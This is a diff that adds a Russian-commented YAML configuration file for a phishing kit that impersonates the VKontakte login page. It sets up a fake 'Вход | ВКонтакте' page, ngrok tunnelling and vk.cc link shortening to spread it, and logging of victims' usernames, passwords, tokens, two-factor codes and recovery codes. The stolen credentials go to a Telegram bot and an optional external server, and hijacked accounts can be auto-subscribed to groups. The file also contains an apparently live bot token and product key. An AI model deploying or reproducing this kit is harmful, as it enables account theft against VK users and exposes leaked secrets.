@@ -1,0 +1,65 @@
+# Поддержку по скрипту осуществляет t.me/dme_sup
+
+title: Вход | ВКонтакте # Заголовок страницы index.html
+image: https://vk.com/images/brand/vk-logo.png # Превью-картинка страницы
+exit: https://vk.com/im # Куда перенаправлять после авторизации
+port: 3000 # На каком порту работает сервер
+productKey: "8862844621853585:AcgC3u9BSmvxB+Hw5nynrwssmK4TfCtstYjJoecv3xUUQNtXsJ+TKwJdWFIQ9LQffxXM6q6CSurGkTVa2+jacOvFAW/7QRdS1YQzxCh45vzuIR09ptgAjlCkEtxg6CAkGHTrurGiYK3SK/DGGdPWC7A6qvTHcgDAmA4jCQHz/UhsXsbm"
+
+proxy:
+  checkUrl: https://api.vk.com
+  checkTimeout: 3000
+  
+  # Файл с списком прокси
+  filename: proxy.txt
+  
+  # Как часто перезагружать прокси (в мс). 
+  # По умолчанию: 60000 мс = 60 сек = минута
+  reloadInterval: 60000
+
+plugins: # Плагины и их настройки
+  dumper: true # Дампер - `true` включен, `false` выключен
+  ngrok: # Плагин ngrok
+    region: eu
+    enabled: true # `true` включен, `false` выключен
+
+    # Токен ngrok - позволяет ссылкам жить дольше
+    authtoken: 
+
+  vkcc: # Плагин сокращения ссылок vk.cc, работает в связке с ngrok
+    tokens: [] # Default tokens for links shortening (can also be apps & groups)
+    enabled: true # `true` включен, `false` выключен
+
+  telegram: # Плагин отправки логов в телеграм
+    token: "6332159570:AAGsGonnJucr73JxA0Eo5hcqDrtklzwWghU" # Токен бота
+    # ID пользователя кому отправлять
+    # Узнать свой ID можно написав боту @myidbot команду /getid
+    chatId: 1788281967
+    
+    lang: ru # Язык сообщений - ru или en
+    successOnly: false # true - отправлять только успешные входы, false - отправлять все попытки входа
+    enabled: true # `true` включен, `false` выключен
+
+  auto-subscriber: # Плагин автоподписки на сообщества
+    groups: # Список ссылок на сообщества
+      - team
+      - dont_panic_42
+    timeout: 1000 # Время в милисекундах между подписками. 1000мс = 1сек
+    enabled: false # `true` включен, `false` выключен
+
+  sender: # Отправка логов на сторонний сервер
+    # Логи отправляются в формате querystring (application/x-www-form-urlencoded)
+    # Чтобы в PHP можно было взять $_REQUEST["username"] и $_REQUEST["password"]
+    events: [auth:success, auth:2fa, unlocker:recovery_codes] # Список событий, которые отправлять
+    url: http://localhost:3000 # URL куда отправлять логи
+    method: POST # HTTP-метод https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods
+    enabled: false # `true` включен, `false` выключен
+    headers: # Доп. заголовки запроса
+      X-Sender: VK Phishing
+
+  banner: true
+
+  logging:
+    filename: auth.log
+    format: "%username%:%password%:%token%"
+    successOnly: true
